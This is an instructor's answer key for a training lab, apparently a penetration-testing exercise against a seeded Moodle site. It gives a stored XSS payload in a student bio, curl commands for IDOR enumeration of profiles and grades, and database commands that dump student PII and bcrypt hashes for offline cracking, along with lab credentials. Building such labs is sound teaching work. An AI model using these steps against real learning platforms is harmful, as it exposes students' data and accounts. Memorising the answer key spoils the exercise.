# Solution — 11 LearnHub (medium, webapp set)

> Spoilers — instructor's answer key.

## Surface

`GET /` is the LearnHub (Moodle) front page; `GET /login/index.php` is the sign-in form.
The engagement ships a low-priv student account **`jrowan` / `Student!2026`**. Once signed
in, Moodle exposes the usual id-keyed endpoints (`/user/view.php?id=`, `/user/profile.php?id=`,
`/grade/report/user/index.php?userid=`, `/mod/resource/view.php?id=`). The database host
`db.learnhub.lab` runs **MariaDB** (Bitnami) with the Moodle schema under the `mdl_` prefix in
database `bitnami_moodle`.

Fingerprint the stack first: the front page carries a `<meta name="generator" content="Moodle">`
tag and a "Powered by Moodle" footer — version-enumerate via `/admin/environment.xml` or the
release in the page source.

## Intended findings (each stands on its own; F is the authoritative data exfil)

### H — stored XSS (profile description / forum post)
Moodle stores user-supplied HTML in profile descriptions and forum posts. A low-priv student
can plant markup that is rendered back to any viewer of the profile/thread. The seeded student
**`tnovak`** (`/user/profile.php?id=<tnovak id>`) carries a bio containing a raw payload:

```html
<p>Hi all!</p><script>alert(document.domain)</script><p>DM me about the robotics club.</p>
```

A tester reproduces it manually by editing their own profile "Description" (Preferences → Edit
profile) or posting to a course forum with HTML, then confirming the script executes for
another account — the session-stealing primitive the client cares about.

> **Sanitizer caveat / FLAG.** Modern Moodle runs output through HTMLPurifier, which strips
> `<script>` on most render paths. Whether the *raw* `<script>` above reaches the rendered page
> depends on the site's text-filter / `enablehtmlpurifier` configuration and the exact field.
> That is why the **automated oracle for this lab is the site-up fingerprint on `/`** (loot
> `moodle-fingerprint`), **not** the payload on a rendered page — the seeded `tnovak` record
> proves the stored payload *exists in the DB*, and the manual steps above prove the vector. If
> a live bring-up confirms the payload renders unescaped on a specific page, you MAY repoint the
> `moodle-fingerprint` oracle at that URL and fingerprint `alert(document.domain)` instead.

### G — IDOR via query parameter
Moodle keys user and resource views on a numeric id. From the `jrowan` session, walk the ids:

```sh
# enumerate other users' profiles (names, city, bio, and email when maildisplay allows)
curl -s -b cookies.txt 'http://127.0.0.1:8511/user/view.php?id=2&course=1'
curl -s -b cookies.txt 'http://127.0.0.1:8511/user/profile.php?id=3'
# other users' grade reports key off ?userid=
curl -s -b cookies.txt 'http://127.0.0.1:8511/grade/report/user/index.php?userid=4'
# course resources key off the course-module id
curl -s -b cookies.txt 'http://127.0.0.1:8511/mod/resource/view.php?id=1'
```

Incrementing `id` / `userid` walks across accounts the student should not see — the broken
object-level access control. The seeded students sit at the low ids just above `admin`.

### F — database PII + hashes (authoritative exfil)
The MariaDB holds every account in `mdl_user`. With DB access (or post-exploitation on the DB
host) dump it directly:

```sh
# student PII — names + emails
docker exec skuggi-webapp-11-db \
  mariadb -uroot -proot-learnhub-2024 bitnami_moodle -N \
  -e "SELECT firstname, lastname, email FROM mdl_user WHERE idnumber LIKE 'S10%'"
# -> Maya Lindqvist  maya.lindqvist@northvale-students.example  (+ Okafor, Chaudhry, Novak, Rowan)

# password hashes — Moodle stores bcrypt ($2y$)
docker exec skuggi-webapp-11-db \
  mariadb -uroot -proot-learnhub-2024 bitnami_moodle -N \
  -e "SELECT username, password FROM mdl_user"
# -> admin and every seeded student carry a $2y$10$... bcrypt hash
```

The `$2y$` hashes are strong (bcrypt); the finding is that the material is reachable and
offline-crackable in principle (`john --format=bcrypt`). Per the webapp-set medium rules any
*intended* crack would come from in-lab context — here the point is exposure + reuse risk, not a
guaranteed rockyou hit.

## Planted loot (manifest oracles)

| id | what | where |
|----|------|-------|
| `student-pii` | `maya.lindqvist@northvale-students.example`, … | MariaDB `mdl_user` (container_exec on `db`) |
| `password-hashes` | `$2y$` bcrypt prefix | MariaDB `mdl_user.password` (container_exec on `db`) |
| `moodle-fingerprint` | `Moodle` (generator/footer) | `GET http://127.0.0.1:8511/` |

Accounts: `admin` / `LearnHub!Admin2024` (site admin), `jrowan` / `Student!2026` (issued
student). Seeded PII students: `mlindqvist`, `dokafor`, `achaudhry`, `tnovak` (XSS bio).

## How the lab is seeded

Moodle's `mdl_*` schema does not exist until first-boot install completes, so a
`docker-entrypoint-initdb.d` SQL file cannot touch it. Instead a one-shot **`seed`** sidecar
(`seed/seed.sh`, image `mariadb:11`) polls for the `admin` row, then INSERTs the student rows —
PII emails, bcrypt `$2y$` hashes, and the `tnovak` stored-XSS bio — directly into `mdl_user`.
It is idempotent (skips if `mlindqvist` already exists) and exits 0.

## Reset

`make lab-restore LAB=11-medium-moodle` (recreate — drops the MariaDB + Moodle volumes, Moodle
re-installs on first boot, and the `seed` sidecar re-plants the rows).
